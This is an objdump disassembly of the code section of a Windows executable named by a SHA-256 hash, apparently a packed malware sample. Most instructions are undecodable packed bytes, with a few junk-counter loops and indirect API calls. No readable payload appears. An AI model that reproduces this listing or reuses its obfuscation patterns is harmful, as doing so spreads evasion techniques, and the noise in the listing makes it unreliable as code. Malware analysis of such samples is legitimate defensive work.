
b0fff0030a67c381e04182ae600397af46f6b5e435494fdcbb00731e1a24d240.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	inc    DWORD PTR [ecx]
  401016:	push   ecx
  401017:	retf   0x7e7e
  40101a:	jle    0x40109a
  40101c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401020:	into   
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [edi]
  40102d:	ror    BYTE PTR [edi+ecx*1],cl
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0xc2
  4010c9:	adc    eax,0x6f9dd44a
  4010ce:	sub    BYTE PTR [edx],cl
  4010d0:	in     eax,dx
  4010d1:	mov    WORD PTR [edi+0x54abe542],ds
  4010d7:	adc    BYTE PTR [ebx],dl
  4010d9:	jmp    0x4010fb
  4010db:	cmc    
  4010dc:	or     eax,0x96e89e54
  4010e1:	push   ss
  4010e2:	repz rcr BYTE PTR [edi+0x7d],1
  4010e6:	test   DWORD PTR [esp+eiz*4],ebx
  4010e9:	std    
  4010ea:	test   BYTE PTR [ebp+0x2b10b8a2],bh
  4010f0:	mov    ebp,0x59310583
  4010f5:	call   0xfa2e:0xde84f8b5
  4010fc:	sub    eax,DWORD PTR [edx+edx*1+0x5e8044cc]
  401103:	jp     0x401086
  401105:	jb     0x4010e3
  401107:	rcl    BYTE PTR [edx],1
  401109:	jg     0x40113e
  40110b:	test   bl,bl
  40110d:	mov    ds:0x948c7920,al
  401112:	adc    eax,0x36f3be7d
  401117:	sti    
  401118:	fcom   QWORD PTR [ecx-0x3caa5c28]
  40111e:	and    al,0x2a
  401120:	dec    eax
  401121:	inc    ebp
  401122:	jmp    0xe9c:0xa1d623f9
  401129:	clc    
  40112a:	ds call 0x539b8634
  401130:	cld    
  401131:	outs   dx,DWORD PTR ds:[esi]
  401132:	xchg   DWORD PTR [eax],esi
  401134:	push   ebx
  401135:	clc    
  401136:	mov    al,ds:0x25d56283
  40113b:	sbb    BYTE PTR [edx-0x1a],0x46
  40113f:	xchg   DWORD PTR [edi],eax
  401141:	pop    edi
  401142:	inc    esp
  401143:	mov    ch,BYTE PTR [eax+0x1fbbda13]
  401149:	add    DWORD PTR [edx+edi*2-0x2bded68e],esi
  401150:	lods   al,BYTE PTR ds:[esi]
  401151:	sub    BYTE PTR [edx+0x18],0x6c
  401155:	sar    BYTE PTR [ecx-0x6b],cl
  401158:	xor    eax,0xba546b53
  40115d:	pop    ebx
  40115e:	(bad)  
  40115f:	mov    ebp,0x75f64283
  401164:	(bad)  
  401165:	pop    ebp
  401166:	xlat   BYTE PTR ds:[ebx]
  401167:	ret    0xf483
  40116a:	push   edi
  40116b:	push   ebp
  40116c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40116d:	pop    edx
  40116e:	sbb    BYTE PTR [ebx+ebx*1],dl
  401171:	pop    edx
  401172:	aam    0xda
  401174:	ins    DWORD PTR es:[edi],dx
  401175:	inc    ecx
  401176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401177:	xor    cl,cl
  401179:	in     al,dx
  40117a:	mov    WORD PTR [esi+0x67],?
  40117d:	cmp    eax,0xe811e18d
  401182:	std    
  401183:	sub    DWORD PTR [esi],edi
  401185:	sar    BYTE PTR [edi],0xd5
  401188:	(bad)  
  401189:	xor    ebp,edi
  40118b:	sub    BYTE PTR [edx+0x52],al
  40118e:	jecxz  0x40111c
  401190:	jbe    0x40114b
  401192:	jmp    0x4011d1
  401194:	mov    ah,0x9c
  401196:	ss daa 
  401198:	out    dx,al
  401199:	shl    DWORD PTR [eax-0x72],cl
  40119c:	mov    eax,0x89af5c01
  4011a1:	popf   
  4011a2:	adc    DWORD PTR [ecx-0x5d],ebx
  4011a5:	test   eax,0x49b68779
  4011aa:	js     0x4011ea
  4011ac:	iret   
  4011ad:	loopne 0x40121f
  4011af:	outs   dx,BYTE PTR ds:[esi]
  4011b0:	imul   edi,DWORD PTR [ebp+0x5f],0x73
  4011b4:	and    bl,0xa9
  4011b7:	lock adc ah,BYTE PTR [ecx+0x75]
  4011bb:	call   0xe766d962
  4011c0:	mov    esp,0x348e5d9
  4011c5:	push   edi
  4011c6:	mov    dh,ah
  4011c8:	(bad)  
  4011c9:	lods   eax,DWORD PTR ds:[esi]
  4011ca:	in     eax,dx
  4011cb:	out    0x4e,eax
  4011cd:	in     al,dx
  4011ce:	test   eax,eax
  4011d0:	mov    esp,0xdff733f7
  4011d5:	dec    eax
  4011d6:	mov    bl,0xaf
  4011d8:	cli    
  4011d9:	pop    ss
  4011da:	adc    ch,ch
  4011dc:	fsubr  DWORD PTR [edi]
  4011de:	jmp    0x40124c
  4011e0:	hlt    
  4011e1:	aas    
  4011e2:	(bad)  
  4011e3:	jl     0x401182
  4011e5:	pop    esi
  4011e6:	arpl   WORD PTR [edi+0x4e],sp
  4011e9:	and    DWORD PTR ds:0xba531f34,ecx
  4011ef:	imul   eax,esp,0x1b7d1034
  4011f5:	push   esi
  4011f6:	add    BYTE PTR [esi-0x73],ch
  4011f9:	inc    eax
  4011fa:	dec    esp
  4011fb:	fnstenv [eax+ecx*2]
  4011fe:	mov    cl,BYTE PTR [eax]
  401200:	sbb    al,0x77
  401202:	mov    esi,0xf9cae675
  401207:	ja     0x401225
  401209:	pop    es
  40120a:	aas    
  40120b:	xor    BYTE PTR [edi+0x241e7025],ah
  401211:	aad    0xb
  401213:	ret    
  401214:	inc    ecx
  401215:	ret    0xd5e3
  401218:	ret    
  401219:	out    0x1,al
  40121b:	jmp    0xed44:0x2283837b
  401222:	cld    
  401223:	mov    bh,0xf0
  401225:	inc    esp
  401226:	dec    edx
  401227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401228:	in     eax,0xe6
  40122a:	cld    
  40122b:	mov    ebp,DWORD PTR [esi]
  40122d:	inc    edx
  40122e:	mov    ds:0x453dc967,al
  401233:	addr16 xor eax,0x218726ba
  401239:	call   0xda65:0x72856477
  401240:	in     al,dx
  401241:	aad    0x8d
  401243:	jge    0x4011cf
  401245:	cwde   
  401246:	int    0xf6
  401248:	(bad)  ds:0x6d0618c5
  40124e:	push   esi
  40124f:	cmp    dl,BYTE PTR [ebx]
  401251:	mov    cl,bl
  401253:	sub    eax,0x214a840
  401258:	(bad)  
  401259:	icebp  
  40125a:	(bad)  
  40125b:	mov    ah,0x72
  40125d:	sbb    eax,0x61fdb281
  401262:	mov    es,WORD PTR [edi+0x4b]
  401265:	les    ebp,FWORD PTR [esi]
  401267:	fisub  DWORD PTR [ecx]
  401269:	mov    bh,0xb0
  40126b:	fdivr  DWORD PTR [ebx-0x1d]
  40126e:	push   eax
  40126f:	fnop   
  401271:	mov    ebp,0x49ac06f8
  401276:	add    BYTE PTR [ecx+0x7f],0x5c
  40127a:	mov    eax,0x1e3f24e5
  40127f:	retf   0x1375
  401282:	pop    esi
  401283:	adc    al,0x13
  401285:	pop    es
  401286:	ret    
  401287:	shl    DWORD PTR [esi-0x43],1
  40128a:	jg     0x4012cc
  40128c:	fadd   DWORD PTR [esi+0x5191d9fe]
  401292:	fidivr DWORD PTR [edi]
  401294:	jle    0x401259
  401296:	pop    ecx
  401297:	jp     0x401276
  401299:	cld    
  40129a:	leave  
  40129b:	ret    
  40129c:	pop    ecx
  40129d:	cmp    eax,0xc29770a1
  4012a2:	adc    bh,bl
  4012a4:	xor    esp,DWORD PTR [ebx]
  4012a6:	fist   DWORD PTR [eax-0x3fe9df3d]
  4012ac:	add    eax,0xe16253ae
  4012b1:	outs   dx,DWORD PTR ds:[esi]
  4012b2:	mov    esp,DWORD PTR [edi-0x57]
  4012b5:	cmp    DWORD PTR [esi+0x17],edx
  4012b8:	dec    edi
  4012b9:	mov    ebp,0xb6c2edd6
  4012be:	jno    0x401292
  4012c0:	dec    edx
  4012c1:	xchg   edx,eax
  4012c2:	mov    ch,0x8b
  4012c4:	pop    esi
  4012c5:	cld    
  4012c6:	clc    
  4012c7:	and    dl,cl
  4012c9:	and    al,0x25
  4012cb:	outs   dx,BYTE PTR ds:[esi]
  4012cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012cd:	pop    ebp
  4012ce:	rcr    DWORD PTR [ecx-0x5a854970],1
  4012d4:	call   0x576feb8a
  4012d9:	jmp    0xc545:0xf707c414
  4012e0:	pop    ss
  4012e1:	mov    bh,0x32
  4012e3:	inc    edi
  4012e4:	(bad)  
  4012e6:	aaa    
  4012e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012e8:	sbb    bl,BYTE PTR [edx+edi*8]
  4012eb:	or     BYTE PTR [edx+0x3b],ah
  4012ee:	inc    ebp
  4012ef:	into   
  4012f0:	and    BYTE PTR [eax-0x6814e147],0x68
  4012f7:	sbb    eax,0x679b3f64
  4012fc:	fs jmp 0xb140:0x839ee443
  401304:	inc    edx
  401305:	xchg   ecx,eax
  401306:	add    edx,edx
  401308:	inc    edi
  401309:	pop    ebp
  40130a:	push   edi
  40130b:	sub    al,0x5e
  40130d:	pop    edi
  40130e:	mov    ebx,DWORD PTR [ebp+0x3cdcb768]
  401314:	jg     0x4012ad
  401316:	test   DWORD PTR [ebp-0x34c12b33],ecx
  40131c:	jns    0x4012e7
  40131e:	xchg   edx,eax
  40131f:	jb     0x40132a
  401321:	ret    0x1a5e
  401324:	mov    ds:0x9b884e21,eax
  401329:	pop    ss
  40132a:	and    dh,ah
  40132c:	shl    DWORD PTR ds:0x7c511177,0xe7
  401333:	jg     0x401339
  401335:	and    eax,0x93fc0ea
  40133a:	pop    ebx
  40133b:	scas   al,BYTE PTR es:[edi]
  40133c:	sub    dh,BYTE PTR [esi]
  40133e:	ret    0x4b9f
  401341:	sub    dl,BYTE PTR [ebx+eiz*4-0x66b5dfd9]
  401348:	nop
  401349:	and    bl,cl
  40134b:	cmp    cl,BYTE PTR [ebx+edi*8+0x19627395]
  401352:	xor    eax,0xccf0d517
  401357:	int    0x75
  401359:	push   ebp
  40135a:	popa   
  40135b:	and    cl,BYTE PTR [eax]
  40135d:	sub    al,0x4f
  40135f:	sbb    al,0x78
  401361:	cli    
  401362:	icebp  
  401363:	clc    
  401364:	out    dx,al
  401365:	dec    ecx
  401366:	sbb    bl,ch
  401368:	and    ecx,ecx
  40136a:	fwait
  40136b:	ss popf 
  40136d:	fistp  DWORD PTR [ebp+eax*4+0x4e]
  401371:	scas   eax,DWORD PTR es:[edi]
  401372:	xchg   esp,eax
  401373:	inc    ecx
  401374:	jmp    0x40136a
  401376:	xchg   esp,eax
  401377:	pop    edi
  401378:	sbb    DWORD PTR [ebx+0x6f453da5],esp
  40137e:	and    al,0x22
  401380:	push   esp
  401381:	repnz pop ecx
  401383:	in     al,0x62
  401385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401386:	inc    esi
  401387:	push   ebx
  401388:	(bad)  
  401389:	scas   al,BYTE PTR es:[edi]
  40138a:	cdq    
  40138b:	inc    ebx
  40138c:	sahf   
  40138d:	int3   
  40138e:	es pop ss
  401390:	(bad)  
  401391:	(bad)  
  401392:	aaa    
  401393:	dec    ecx
  401394:	das    
  401395:	nop
  401396:	jno    0x4013fe
  401398:	jbe    0x4013b4
  40139a:	mov    dh,0x3f
  40139c:	mov    esp,0x60bb5ad3
  4013a1:	(bad)  
  4013a2:	iret   
  4013a3:	fstp   QWORD PTR [ebp+ecx*8+0x74d3069]
  4013aa:	xor    al,0xea
  4013ac:	jo     0x4013d2
  4013ae:	push   ds
  4013af:	ins    BYTE PTR es:[edi],dx
  4013b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013b1:	call   0xecc32cf8
  4013b6:	sub    al,0xc7
  4013b8:	inc    ebp
  4013b9:	clc    
  4013ba:	xor    al,BYTE PTR [ebp+0x3d19f89c]
  4013c0:	push   es
  4013c1:	push   es
  4013c2:	inc    ebx
  4013c3:	add    bh,al
  4013c5:	inc    ebp
  4013c6:	in     al,dx
  4013c7:	xor    eax,0x2bf89c85
  4013cc:	enter  0x7b8,0x95
  4013d0:	add    BYTE PTR [eax],al
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42efa0,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42efa0,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42efa0,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42eb6c
  401403:	mov    ecx,DWORD PTR ds:0x42efa0
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42efa0,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42efa4
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x4306d6,0x15
  401428:	cmp    DWORD PTR ds:0x4306d6,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x4306d6,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e965
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42eb70
  40145f:	cmp    DWORD PTR ds:0x4306d6,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x4306d6
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x4306d6,ecx
  401479:	mov    ecx,DWORD PTR ds:0x4306d6
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x4306d6,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43061a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x1850:0xc48b26e
  4014ab:	and    BYTE PTR [ebx-0x2e],0x82
  4014af:	jno    0x40152f
  4014b1:	jle    0x401435
  4014b3:	jno    0x401533
  4014b5:	jle    0x4014c7
  4014b7:	stc    
  4014b8:	fild   QWORD PTR [edi]
  4014ba:	cs mov ch,0x60
  4014bd:	jne    0x401526
  4014bf:	xor    edi,0xbea8593f
  4014c5:	sbb    eax,0x7db97f67
  4014ca:	push   fs
  4014cc:	mov    dh,0xf
  4014ce:	mov    edx,0x72ef3367
  4014d3:	mov    ds:0x2a689696,eax
  4014d8:	int    0xdc
  4014da:	push   ebp
  4014db:	push   es
  4014dc:	shr    eax,1
  4014de:	iret   
  4014df:	sub    eax,0x345e0089
  4014e4:	dec    ebp
  4014e5:	mov    al,0x2c
  4014e7:	leave  
  4014e8:	inc    esp
  4014e9:	cmp    DWORD PTR [edx+0x42],eax
  4014ec:	call   DWORD PTR [ebp+0x40]
  4014ef:	ficomp WORD PTR [esi-0x70]
  4014f2:	xchg   edi,eax
  4014f3:	retf   0xba20
  4014f6:	pop    ebp
  4014f7:	sbb    edx,DWORD PTR es:[edi-0x6a6073e3]
  4014fe:	mov    dl,BYTE PTR [ecx-0x3bba4ecc]
  401504:	aam    0x7c
  401506:	xchg   esp,eax
  401507:	push   cs
  401508:	jmp    0x4014a4
  40150a:	pushf  
  40150b:	pop    ds
  40150c:	adc    dl,BYTE PTR [esi-0x39]
  40150f:	inc    ebp
  401510:	jl     0x40153c
  401512:	mov    es,ecx
  401514:	mov    ecx,0xf899d86f
  401519:	mov    eax,0xfbfc758c
  40151e:	mov    al,ds:0x2b2662f1
  401523:	jp     0x401531
  401525:	jecxz  0x4014b7
  401527:	call   0x4ae38a85
  40152c:	pushf  
  40152d:	imul   esp,DWORD PTR [ebx],0xffffff99
  401530:	or     eax,0x3b2e32dc
  401535:	xchg   BYTE PTR [ebp+0x27ba9302],bh
  40153b:	cdq    
  40153c:	mov    esp,0xa90b6f70
  401541:	fwait
  401542:	sbb    ecx,0x3479e88b
  401548:	dec    edx
  401549:	repnz mov ah,0x84
  40154c:	pop    eax
  40154d:	lahf   
  40154e:	mov    edx,0x7ca350cd
  401553:	and    DWORD PTR [edx+ebp*1-0x51ffe2a4],esi
  40155a:	ja     0x401507
  40155c:	hlt    
  40155d:	inc    DWORD PTR [eax-0x62]
  401560:	sar    BYTE PTR [eax-0x3a],1
  401563:	xchg   edi,eax
  401564:	xor    BYTE PTR [edi],ch
  401566:	mov    ds:0x905e7f9d,eax
  40156b:	in     al,0x47
  40156d:	fcom   QWORD PTR [eax]
  40156f:	cwde   
  401570:	dec    ebx
  401571:	pop    edi
  401572:	ret    0xf9f5
  401575:	xor    DWORD PTR [esi+eax*4],ebp
  401578:	pop    ds
  401579:	scas   eax,DWORD PTR es:[edi]
  40157a:	into   
  40157b:	test   BYTE PTR [edx-0x46364645],bh
  401581:	dec    eax
  401582:	push   ds
  401583:	lods   al,BYTE PTR ds:[esi]
  401584:	clc    
  401585:	mov    ds:0xd26328db,al
  40158a:	xlat   BYTE PTR ds:[ebx]
  40158b:	jg     0x40155d
  40158d:	or     al,0xcf
  40158f:	ret    0xcce7
  401592:	lahf   
  401593:	adc    BYTE PTR [edi-0x63],cl
  401596:	stos   DWORD PTR es:[edi],eax
  401597:	fild   WORD PTR [ebx+0x44]
  40159a:	fldenv [edx]
  40159c:	ret    0xb2b3
  40159f:	dec    esp
  4015a0:	jbe    0x40160f
  4015a2:	jae    0x40155d
  4015a4:	jecxz  0x4015a9
  4015a6:	push   ecx
  4015a7:	dec    ebx
  4015a8:	hlt    
  4015a9:	xor    al,0x5d
  4015ab:	add    ch,BYTE PTR [ebx]
  4015ad:	gs inc esp
  4015af:	ret    0xb164
  4015b2:	enter  0x48ea,0x4a
  4015b6:	mov    dl,0x5e
  4015b8:	repnz dec esi
  4015ba:	inc    edi
  4015bb:	loop   0x4015fa
  4015bd:	popa   
  4015be:	inc    ebx
  4015bf:	add    BYTE PTR [ebx*8+0x7f25668b],cl
  4015c6:	shr    DWORD PTR [ebx-0x5d39e04e],1
  4015cc:	jmp    0x401647
  4015ce:	xor    DWORD PTR cs:[edx-0x1475c6d1],esp
  4015d5:	aad    0x7d
  4015d7:	scas   al,BYTE PTR es:[edi]
  4015d8:	in     eax,0xef
  4015da:	(bad)
  4015dd:	adc    DWORD PTR [edi+edx*2+0x2aa59d48],0xf17e7ac9
  4015e8:	push   DWORD PTR [ebp+0x51]
  4015eb:	out    dx,al
  4015ec:	ror    cl,cl
  4015ee:	mov    al,0x27
  4015f0:	lds    edi,FWORD PTR [ebp+edi*4-0x1337357d]
  4015f7:	stos   DWORD PTR es:[edi],eax
  4015f8:	mov    DWORD PTR [edx+0xa8287],edx
  4015fe:	inc    ebx
  4015ff:	jl     0x4015a9
  401601:	(bad)  
  401602:	int    0xb2
  401604:	or     eax,0xd3f97eb6
  401609:	and    BYTE PTR [edi-0xd],ch
  40160c:	loop   0x401603
  40160e:	xchg   esi,eax
  40160f:	outs   dx,BYTE PTR ds:[esi]
  401610:	xchg   esp,eax
  401611:	test   DWORD PTR ds:0x523a878f,esi
  401617:	aad    0xba
  401619:	inc    ebx
  40161a:	and    BYTE PTR [ebp+edx*8-0x3d6a1185],0x72
  401622:	push   0x5efb6cd7
  401627:	mov    dh,0x79
  401629:	idiv   BYTE PTR [edx]
  40162b:	call   0x83968dc0
  401630:	and    al,0xb1
  401632:	inc    ebx
  401633:	pop    ebp
  401634:	test   al,0xcd
  401636:	ret    
  401637:	sbb    al,0x5c
  401639:	mov    ebx,0xbf827c10
  40163e:	fstp   TBYTE PTR [ebx-0x4daed1a4]
  401644:	outs   dx,DWORD PTR ds:[esi]
  401645:	or     DWORD PTR [edi+edx*2+0x1b],edx
  401649:	idiv   BYTE PTR [esi-0x6f]
  40164c:	popa   
  40164d:	sbb    eax,0xf5d5af26
  401652:	call   0xea2c:0x837f0b89
  401659:	mov    ah,0xbb
  40165b:	adc    al,0x12
  40165d:	add    DWORD PTR [ebx-0x11],eax
  401660:	stc    
  401661:	pop    edi
  401662:	add    dh,ah
  401664:	sti    
  401665:	retf   
  401666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401667:	cld    
  401668:	scas   eax,DWORD PTR es:[edi]
  401669:	mov    ebp,0x4871cf32
  40166e:	pushf  
  40166f:	push   edx
  401670:	iret   
  401671:	pop    ds
  401672:	mov    eax,ds:0xab3defad
  401677:	xor    DWORD PTR [eax+esi*1+0x43],edi
  40167b:	ret    
  40167c:	mov    DWORD PTR [ebp-0x13b06c39],ebp
  401682:	mov    al,0x5d
  401684:	repz mov ds:0xc0e6ed66,al
  40168a:	cs cmp eax,0x1a34c278
  401690:	leave  
  401691:	ret    
  401692:	or     ebp,edx
  401694:	pop    esi
  401695:	jno    0x4016b4
  401697:	(bad)  
  401698:	out    dx,al
  401699:	mov    edx,0xc12d1c9
  40169e:	retf   
  40169f:	cmp    eax,0xec4245eb
  4016a4:	stos   DWORD PTR es:[edi],eax
  4016a5:	movmskps edx,xmm4
  4016a8:	jl     0x4016d7
  4016aa:	mov    al,ds:0x4b909e01
  4016af:	icebp  
  4016b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016b1:	sbb    al,0xb3
  4016b3:	mov    eax,ds:0xc1ad5a05
  4016b8:	cs push cs
  4016ba:	push   edi
  4016bb:	sbb    BYTE PTR [esi],cl
  4016bd:	dec    eax
  4016be:	lods   al,BYTE PTR ds:[esi]
  4016bf:	cld    
  4016c0:	push   eax
  4016c1:	cld    
  4016c2:	das    
  4016c3:	sbb    dl,ah
  4016c5:	cmp    DWORD PTR ds:[si-0x3a37],eax
  4016cb:	mov    DWORD PTR [ebx+eiz*1+0xc9c575e],ecx
  4016d2:	cwde   
  4016d3:	sbb    ah,0x5f
  4016d6:	gs jmp 0x6cb6:0x4619b21a
  4016de:	cmc    
  4016df:	and    BYTE PTR [ebp-0x7c9b9fe7],cl
  4016e5:	outs   dx,BYTE PTR ds:[esi]
  4016e6:	clc    
  4016e7:	pop    ebx
  4016e8:	xchg   edi,eax
  4016e9:	cmp    bl,BYTE PTR [esi+edi*2+0x56bf56a4]
  4016f0:	fistp  WORD PTR [ebp-0x3c]
  4016f3:	call   0x2561:0xda71dde9
  4016fa:	xchg   ebp,eax
  4016fb:	xchg   esi,ecx
  4016fd:	cwde   
  4016fe:	or     DWORD PTR [eax-0x78f33ec9],edx
  401704:	adc    DWORD PTR [esi+0x37],esp
  401707:	sbb    bh,BYTE PTR [ebp+0x2c]
  40170a:	iret   
  40170b:	jnp    0x401786
  40170d:	or     eax,0xa08d41c9
  401712:	fnstsw WORD PTR [ebx+0x6b8e593a]
  401718:	cmp    bl,dh
  40171a:	xor    ecx,DWORD PTR [ebp+eiz*8-0x2dee29f5]
  401721:	sar    ecx,1
  401723:	or     dl,BYTE PTR [edx+0x22]
  401726:	sub    al,0x26
  401728:	mov    bx,WORD PTR [ecx-0x12]
  40172c:	xlat   BYTE PTR ds:[ebx]
  40172d:	sbb    DWORD PTR [ebx+0x0],esi
  401730:	adc    dl,ah
  401732:	xchg   ecx,eax
  401733:	in     al,0x5c
  401735:	jmp    0x7ac963bf
  40173a:	jge    0x401773
  40173c:	es fld TBYTE PTR ss:[edi-0x24]
  401741:	xchg   BYTE PTR [eax+0x69b14c0e],cl
  401747:	loopne 0x401718
  401749:	push   ebx
  40174a:	sbb    dh,BYTE PTR [eax]
  40174c:	xchg   cx,ax
  40174e:	push   esi
  40174f:	out    0x56,eax
  401751:	xor    esi,DWORD PTR [ebx]
  401753:	jae    0x4017c5
  401755:	fwait
  401756:	shl    BYTE PTR [ecx+0x7cbb20c0],1
  40175c:	sti    
  40175d:	jmp    0x401788
  40175f:	mov    BYTE PTR [edx-0x30],dh
  401762:	fist   DWORD PTR [edx-0x6f]
  401765:	jb     0x4017db
  401767:	imul   eax,DWORD PTR [edx+0x33678c9a],0x894b3f96
  401771:	mov    dl,0x69
  401773:	pop    eax
  401774:	jo     0x401782
  401776:	sti    
  401777:	ss int3 
  401779:	rcr    DWORD PTR [esi-0x1b],cl
  40177c:	ins    BYTE PTR es:[edi],dx
  40177d:	xor    DWORD PTR ds:0xe50a6f8c,esp
  401783:	(bad)  
  401784:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  401786:	pop    ecx
  401787:	std    
  401788:	dec    edi
  401789:	xchg   ebx,eax
  40178a:	add    edi,DWORD PTR [esi-0x5305fa30]
  401790:	xchg   edi,eax
  401791:	adc    DWORD PTR ds:0xd9bbf113,esi
  401797:	xor    ah,dh
  401799:	test   BYTE PTR [ecx-0x4c],ah
  40179c:	test   al,0x17
  40179e:	mov    ebx,DWORD PTR [ebp+0x19e590f5]
  4017a4:	shl    DWORD PTR [ebx+edx*8+0x2d],1
  4017a8:	(bad)  
  4017a9:	xchg   esi,eax
  4017aa:	xor    DWORD PTR [esi],edi
  4017ac:	push   ebx
  4017ad:	jmp    0x75d8502d
  4017b2:	mov    WORD PTR [eax+0x60],cs
  4017b5:	adc    cl,dl
  4017b7:	mov    ah,BYTE PTR [edi-0x9882744]
  4017bd:	mov    WORD PTR [edx],ds
  4017bf:	mov    edi,ebx
  4017c1:	dec    edx
  4017c2:	shr    dl,0x60
  4017c5:	push   ss
  4017c6:	cmp    eax,0x6d441aee
  4017cb:	ds adc al,ch
  4017ce:	adc    eax,0x7a534c93
  4017d3:	fisubr DWORD PTR [esp+eiz*4]
  4017d6:	mov    ecx,0x3e9ff99e
  4017db:	add    al,0xa3
  4017dd:	(bad)  
  4017de:	dec    edi
  4017df:	and    DWORD PTR [esp+ebx*8],ebp
  4017e2:	xchg   ebx,eax
  4017e3:	xchg   edi,eax
  4017e4:	mul    BYTE PTR [ebx-0x6e]
  4017e7:	push   0xeee5749c
  4017ec:	lahf   
  4017ed:	imul   BYTE PTR [eax+0x558af07f]
  4017f3:	hlt    
  4017f4:	dec    edi
  4017f5:	shr    BYTE PTR [edi+0x708df46b],cl
  4017fb:	inc    edi
  4017fc:	push   cs
  4017fd:	loop   0x401813
  4017ff:	jae    0x4017d6
  401801:	sar    BYTE PTR [edi+0x13c1ecd],0xdf
  401808:	or     bl,BYTE PTR [esi-0x2a]
  40180b:	rcr    BYTE PTR ds:0x4379dc99,1
  401811:	loope  0x40184a
  401813:	mov    bl,0xde
  401815:	(bad)  
  401816:	lock xchg esi,eax
  401818:	cmp    ah,ah
  40181a:	clc    
  40181b:	outs   dx,BYTE PTR ds:[esi]
  40181c:	fnstenv [edx+ecx*1]
  40181f:	add    BYTE PTR [edx+0x43],ah
  401822:	out    dx,al
  401823:	leave  
  401824:	push   0x5472075b
  401829:	dec    esi
  40182a:	(bad)  
  40182b:	loop   0x4017af
  40182d:	out    0x37,al
  40182f:	mov    BYTE PTR [esi],bl
  401831:	dec    edi
  401832:	scas   al,BYTE PTR es:[edi]
  401833:	in     al,dx
  401834:	dec    edi
  401835:	and    esi,DWORD PTR [esi-0xd]
  401838:	pop    es
  401839:	jle    0x401800
  40183b:	and    al,0x68
  40183d:	lahf   
  40183e:	repz adc ecx,DWORD PTR ds:0x2caa5d34
  401845:	dec    ebx
  401846:	retf   0xffe7
  401849:	scas   eax,DWORD PTR es:[edi]
  40184a:	mov    DWORD PTR [ebp-0x20],eax
  40184d:	neg    DWORD PTR ds:0x430616
  401853:	push   ebx
